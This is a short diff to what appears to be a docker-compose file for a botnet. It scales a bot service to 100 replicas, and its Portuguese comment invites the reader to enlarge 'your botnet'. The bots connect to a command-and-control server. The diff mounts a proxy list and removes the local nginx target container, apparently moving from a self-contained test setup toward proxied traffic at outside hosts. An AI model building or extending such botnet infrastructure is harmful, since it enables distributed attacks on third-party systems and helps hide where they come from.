@@ -15,16 +15,13 @@ services:
       replicas: 100 # Ajuste para aumentar o tamanho da sua botnet
     environment:
       - C2_URL=http://c2-server:5000
+    volumes:
+      - ./proxies.json:/proxies.json:ro
     networks:
       - botnet_net
     depends_on:
       - c2-server
 
-  target-server:
-    image: nginx:alpine
-    container_name: target_web_server
-    networks:
-      - botnet_net
 
 networks:
   botnet_net:
